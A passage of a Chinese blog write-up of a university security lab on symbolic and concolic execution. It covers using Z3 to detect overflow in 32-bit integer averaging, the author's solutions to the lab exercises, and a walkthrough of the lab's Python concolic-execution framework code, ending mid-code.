作为使用 Z3 的例子：  <em>计算两个 32 位整型的平均值</em>  ，一个最简单的算法是 <code>(x + y) / 2</code> ，但这可能会发生<strong>整型上溢</strong>，从而得到  <em>模 2<sup>32</sup></em> 上的值（想了解更多，参见  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ）——Z3 可以帮我们检查这个错误：予其一个布尔表达式，Z3 可以告诉我们其<strong>是否为真</strong>（即可以被满足）；若表达式可以为真且包含一些变量，Z3 可以给我们一些使表达式为真的🌰变量</p><p>现在我们来看这份代码（这里不会仔细讲 Z3 的用法，不懂的 <a href="https://z3prover.github.io/api/html/">自行查文档</a>），其首先会使用 Z3 创建两个 32 位的位向量 a 与 b：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>接下来分别计算有/无符号除法下两数的平均值，注意这里<strong>并没有实际进行计算，而仅是保存了符号变量表达式</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>由于 32 位整数加法可能存在溢出，故这里为了求得其正确的平均值，我们将其扩展为两个 33 位的位向量，完成计算后再截断回 32 位（不会导致结果错误，因为 32 位的平均值总会在 32 位内）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>最后就是求解是否存在能够发生整型溢出的约束，即：是否存在这样的两个 32 位整型变量值使得其 32 位下运算结果不与真实计算结果相等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>结果如下，Z3 求解器帮助我们找到了这样的值：</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>接下来是 Exercise 1：通过修改  <code>int-avg.py</code> 中的 <code>u_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的无符号平均值，不能改变操作数的位宽</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPU’s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hacker’s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>./int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>这里笔者给出一个比较笨的解法（毕竟笔者的脑子:  (也想不出啥聪明解法 ）：</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>这个算法的思路比较简单，最初的出发点就是两数之和的平均值不会超出 2<sup>32</sup>，那么我们只要先将两数分别除以2再相加就不会发生溢出了，但是奇数除以2会丢失 0.5，所以如果两个数都是奇数的话最后的结果会丢掉1，那么这里我们再将其加上即可</p><p>这里需要注意的是 Z3 <strong>默认为带符号运算</strong>，故这里我们应当使用 <code>z3.UDiv()</code> 来进行<strong>无符号</strong>除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>运行 <code>make check</code>，成功通过 Exercise 1：</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>除了这个算法之外，笔者还了解到有一种算法是利用<strong>位运算</strong>来进行计算：</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>这个算法的基本原理是先提取出<strong>公有部分</strong>，再计算<strong>私有部分的平均值</strong>，最后相加即可得到结果；这个算法也能通过 Exercise 1 ，这里就不重复贴图了</p><p>接下来是 Challenge 1：通过修改  <code>int-avg.py</code> 中的 <code>s_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的<strong>有符号平均值</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>./int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3/2=1 and -3/2=-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>对于带符号值的运算而言，限制在 32 位内的正确计算便没有那么简单了，若我们直接用上面的式子进行计算则很容易被 Z3 找到能导致运算结果错误的例子：</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>为什么在有符号除法下计算出来的结果不一致呢？这是因为在题目中<s>MIT 非常SB地</s>对于正数除法其选择<strong>向下取整</strong>，对于负数除法的截断，其选择的是<strong>向上取整</strong>，但我们的算法是<strong>正数与负数皆向下取整</strong>，因此计算结果就出现了偏差</p><p>由于正数部分没有问题，因此这里我们需要对计算结果为负数的情况进行特殊化处理，<strong>在结果为负数时将向下取整变为向上取整</strong>，因此最后的计算公式如下：</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>首先按照我们原来的公式计算出向下取整的结果，接下来对其符号位进行判断，若为 1 则再判断其私有部分平均值的计算是否发生截断（即私有部分和是否为奇数），若是则说明结果发生了向下取整，此时变为向上取整即可</strong></p><p>由于要对符号位进行判断，所以这里我们使用 <code>z3.LShR()</code> 将初始运算结果作为无符号整型进行右移操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>运行结果如下，成功通过 Challenge 1：</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution">Interlude: what are symbolic and concolic execution?</h2><p>正如我们前面在 EXE 的论文中所见，符号执行是一种通过观测程序在不同输入下如何表现来进行程序测试的方法，通常而言其目的是为了获得更高的 <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">代码覆盖率</a></strong> （code coverage）或是 <strong>路径覆盖率</strong> （path coverage），在安全中其比传统代码执行更能触发罕见的可能包含漏洞的代码路径</p><p>从更高层次而言，若我们要构建一个符号执行系统，我们需要解决以下几点：</p><ul><li>由于程序包含基于输入的中间值（例如输入两个整型并计算平均值，并存放在一些变量中），我们需要记住输入与这些中间值间的关系，通常这通过允许变量或内存位置有  <em>具体的</em> （concrete，例如 114514 这样的实际值） 或  <em>符号的</em>  （symbolic，例如我们在上一小节构建的符号变量） 值</li><li>我们需要根据输入来确定要执行的控制流分支，这归结于在程序每次发生分支时构建符号约束，在程序选择一些特定分支时描述布尔条件（以程序原有输入的形式）；由于我们持续保存中间值与程序原有输入的间隙，我们并不需要通过原有输入来计算约束，这些约束就像我们在前文中用来寻找整型中漏洞的约束；确定控制流约束非常重要，因为若程序初始时进入了特定分支路径，我们想要知道如何让他走到另一条路径来寻找是否存在漏洞，在 EXE 的论文中使用了一个 C-to-C 的翻译器来在所有的分支上插入他们的代码</li><li>对于每一条上述分支，我们需要决定是否有一个输入能够让程序在一条分支上执行另一条路径（更准确地说，我们考虑整个控制流路径而非单个路径），这帮助我们在程序中寻找可以让我们通过调整输入来影响的控制流条件，所有的符号执行系统都基于 SMT 求解器来完成这些工作</li><li>我们需要确定我们在测试中寻找的是什么，这是我们从程序中确保  <em>不变量</em>  （invariant）来考虑的最佳方法，而符号执行寻找改变这些常量的输入（<s>👴也没咋读明白，可以看实验手册原句</s>）；我们可以寻找的事物之一是<strong>程序崩溃</strong>（crashes，即不变量是  <em>我们的程序不应当崩溃</em>  ），在 C 程序中这非常有意义，因为 crashes 通常指示了代表漏洞的内存损坏，在 Python 这样更高级的语言中在设计上并不存在内存损坏，但我们仍然可以寻找如 Python 代码级的代码注入攻击（例如 <code>eval()</code> ）或是特定于某种应用的影响安全的不变量</li><li>最终，对于给出程序中所有可能执行的控制流路径，我们需要决定该尝试哪条路径，因为路径数量会随着程序规模的增大而快速增长，我们不可能尝试所有的路径，因此符号执行系统通常包含确定哪一条路径更有希望发现破坏不变量的某种  <em>调度器</em>  （scheduler）或  <em>搜索策略</em>  （search strategy），一个简单的搜索策略例子便是尝试未执行过的路径，这代表着更高的代码覆盖率与未被发现的漏洞的存在的可能性</li></ul><p>与符号执行相对的一个选择是  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> （又称 fuzz-testing，模糊测试），其选择了一个随机化方案：不同于关注触发应用中不同代码路径的原因，fuzzing 会创建随机的具体值交给程序执行并检查其行为；虽然这比符号执行更简单，但通常很难构造能满足程序代码中一些特定情况的输入</p><p>构建符号执行系统的一个挑战是我们的系统需要知道如何在符号值上执行所有可能的操作（上面的 Step 1 &amp; 2），在本 Lab 中我们将在 Python 对象（更准确地说，整型与字符串）上实践，对于符号执行而言这很有挑战性，因为 Python 对象可以实现的操作有很多</p><p>幸运的是我们还有一个更简单的选择——  <em>混合执行</em>  （<strong>concolic execution</strong>），介于完全随机的模糊测试与完全的符号执行之间，相较于跟踪纯净的符号值（如 EXE 中所做），其思想是：对于从输入中得到的变量，我们可以<strong>同时保存一个具体值与一个符号值</strong>，由此：</p><ul><li>若我们的 concolic system 知道应用的行为，我们可以像符号执行那样运行（除了我们还会同时传播每个值的 concrete 部分）；例如，假设我们有两个 concolic 整型变量 <code>aa</code> 与 <code>bb</code>，其有着具体值 <code>5</code> 与 <code>6</code> ，并对应符号表达式 <code>a</code> 与  <code>b</code>，此时若应用创建了一个变量 <code>cc = aa + bb</code>，其会同时有着具体值 <code>11</code> 及符号表达式 <code>a + b</code>；类似地，若应用在 <code>cc == 12</code> 的分支上执行，程序可以像分支为假一样执行，并记录对应的符号分支条件 <code>a + b != 12</code></li><li>若我们的 concolic system 不知道应用的当前行为，应用将只会得到具体的值；例如若应用将 <code>cc</code> 写入文件中，或者是传递到外部库中，代码仍可以使用具体值 <code>11</code> 如同应用正常运行那样继续执行</li></ul><p>对于本 lab 而言，混合执行的好处是我们并不需要完全完成对符号值的操作支持，我们只需要支持足够发现漏洞的操作即可（实际上大部分挖洞系统也是如此），不过若应用执行了我们所不支持的操作，我们将失去对符号部分的跟踪，并无法对这些路径进行符号执行式的（symbolic-execution-style）探索，若想了解更多可以参见  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a></p><h2 id="Concolic-execution-for-integers">Concolic execution for integers</h2><p>首先我们将为整型值构建一个混合执行系统，本 Lab 为我们的混合执行提供的框架代码位于 <code>symex/fuzzy.py</code> 中，其实现了几个重要的抽象层：</p><ul><li><p><strong>抽象语法树</strong>（The AST）：与此前我们在 <code>int-avg.py</code> 中使用 Z3 表达式来表示符号值所不同的是，本 Lab 构建了其自己的抽象语法树（abstract syntax tree）来表达符号表达式，一个 AST 节点可以是一个简单的变量（ <code>sym_str</code> 或 <code>sym_int</code> 对象）、一个常量（<code>const_int</code>、<code>const_str</code> 或 <code>const_bool</code> 对象）、或是一些将其他 AST 节点作为参数的函数或操作符（例如 <code>sym_eq(a, b)</code> 表示布尔表达式 <code>a==b</code>，其中 <code>a</code> 与 <code>b</code> 都是 AST 节点，或是 <code>sym_plus(a, b)</code> 表示整型表达式 <code>a + b</code>）</p><p>每个 AST 节点 <code>n</code> 都可以使用 <code>z3expr(n)</code> 转化为 Z3 表达式，这由调用 <code>n._z3expr</code> 完成，即每个 AST 节点都实现了返回对应 Z3 表达式的 <code>_z3expr</code> 方法</p><p>我们使用自己的 AST 层而非使用 Z3 的符号表示的原因是因为我们需要实现一些 Z3 表示难以完成的操作，此外我们需要分出一个独立的进程来调用 Z3 的求解器，以在 Z3 求解器耗时过长时杀死进程——将约束归为不可解（这种情况下我们可能失去这些路径，但至少我们会让程序探索其他路径）；使用我们自己的 AST 能让我们将 Z3 状态完全独立在 fork 出的进程里</p></li><li><p><strong>混合封装</strong>（The concolic wrappers）：为了拦截 python-level 的操作并进行混合执行，我们将常规的 <code>int</code> 与 <code>str</code> 对象替换成了混合的子类：<code>concolic_int</code> 继承自 <code>int</code> 而 <code>concolic_str</code> 继承自 <code>str</code>，每一个混合封装都同时存储一个具体值（<code>self.__v</code> ）与一个符号表达式（与 AST 节点，在 <code>self.__sym</code>），当应用在计算混合值表达式（例如 <code>a+1</code> 中的 <code>a</code> 为 <code>concolic_int</code>），我们需要拦截该操作并返回一个同时包含具体值与符号表达式的的混合值</p><p>为了实现这样的拦截操作，我们重载了 <code>concolic_int</code> 与 <code>concolic_str</code> 类中的一些方法，例如 <code>concolic_int.__add__</code> 在上面的例子 <code>a + 1</code> 中会被调用并返回一个新的混合值表示结果</p><p>原则上我们应该也要有一个 <code>concolic_bool</code> 作为 <code>bool</code> 的子类，不幸的是在 Python 中 <code>bool</code> 不能被继承（参见<a href="https://docs.python.org/3/library/functions.html#bool">这里</a> 与 <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">这里</a>），于是我们创建了函数 <code>concolic_bool</code> 作为代替，当我们创建一个混合布尔值时，程序会按其值进行分支，故 <code>concolic_bool</code> 也会为当前路径条件添加一个约束（布尔值的符号表达式与具体值相等的约束），并返回一个具体的布尔值</p></li><li><p><strong>具体输入</strong>（The concrete inputs）：在混合执行下被测试的程序输入都存储在 <code>concrete_values</code> 字典中，在该字典中存储了程序输入的字符串名字，并将每个名字映射到对应的输入值（整型变量的值为python整型，字符串变量为python字符串）</p><p><code>concrete_value</code> 被设为全局变量的原因是应用通过调用 <code>fuzzy.mk_str(name)</code> 或 <code>fuzzy.mk_int(name)</code> 来创建一个混合字符串或混合整型，其返回一个混合值，其中的符号部分为一个新的 AST 节点对应到一个名为 <code>name</code> 的变量，但具体值被在 <code>concrete_values</code> 中查找，若字典中没有与之关联的变量，系统将其设为默认的初始值（整型为0，字符串为空串）</p><p>混合执行框架在一个 <code>InputQueue</code> 对象中维持一个待尝试的不同输入的队列，框架首先会添加一个初始输入（空字典 <code>&#123;&#125;</code>），之后执行代码，若应用进入了分支，混合执行系统将唤醒 Z3 来带来 新的输入以测试代码中的其他分支，将这些输入放到输入队列中，并保持迭代直到没有输入可以尝试</p></li><li><p><strong>可满足性模理论求解器</strong>（The SMT solver）： <code>fork_and_check(c)</code> 函数会检查约束 <code>c</code> （一个 AST 节点）是否为可满足的表达式，并返回一对值：可满足性状态 <code>ok</code> 及示例模型（分配给变量的值），若约束可以被满足则 <code>ok</code> 为 <code>z3.sat</code> ，若约束不可被满足则 <code>ok</code> 为 <code>z3.unsat</code> 或 <code>z3.unknown</code>；该函数内部会 fork 一个独立的进程来运行 Z3 求解器，若耗时超过 <code>z3_timeout</code> 则杀死进程并返回 <code>z3.unknown</code></p></li><li><p><strong>当前路径条件</strong>（The current path condition）：当应用执行并基于混合值决定控制流时（参见上面关于 <code>concolic_bool</code> 的讨论），表示该分支的约束会被添加到 <code>cur_path_constr</code> 列表中，为了生成能够沿着一条分支从一个点进行不同选择的输入，所需的约束为路径上该点之前的约束集合，加上该点的反向约束；为了帮助调试与启发式搜索，触发了分支的代码行的信息会被存放在 <code>cur_path_constr_callers</code> 列表中</p></li></ul><p>接下来我们的工作是完成对 <code>concolic_int</code> 的实现，并将代码应用于混合执行循环的核心，本 Lab 提供了两个测试程序： <code>check-concolic-int.py</code> 与 <code>check-symex-int.py</code></p><h3 id="混合执行框架代码浅析-Part-1">混合执行框架代码浅析  - Part 1</h3><p>在做 Exercise 之前，我们先看一下这个混合执行框架的代码结构，其核心代码主要位于 <code>symex/fuzzy.py</code> 中</p><h4 id="I-AST-节点">I. AST 节点</h4><p>首先是 AST 节点，作为所有符号类的父类而存在，定义比较简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-符号运算">II. 符号运算</h4><p>然后是 <code>sym_func_apply</code> 类，作为所有符号操作的父节点，这里主要重载了 <code>__eq__()</code> 和 <code>__hash__()</code> 方法，用于比较与计算哈希值，比较的方法就是判断是否所有参数相等，哈希值的计算则是所有参数的哈希值进行异或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>然后是三个类 <code>sym_unop</code> 、<code>sym_binop</code> 、<code>sym_triop</code>，表示带有1、2、3个操作数的封装，可以使用 <code>a</code> 、<code>b</code> 、<code>c</code> 获得第 1、2、3个操作数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>基于 <code>sym_func_apply</code> 与 <code>op</code> 类，封装了相等比较、与、或、非四个操作，其实现原理主要还是转成 Z3 表达式后利用 Z3 的与或非进行运算：：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title 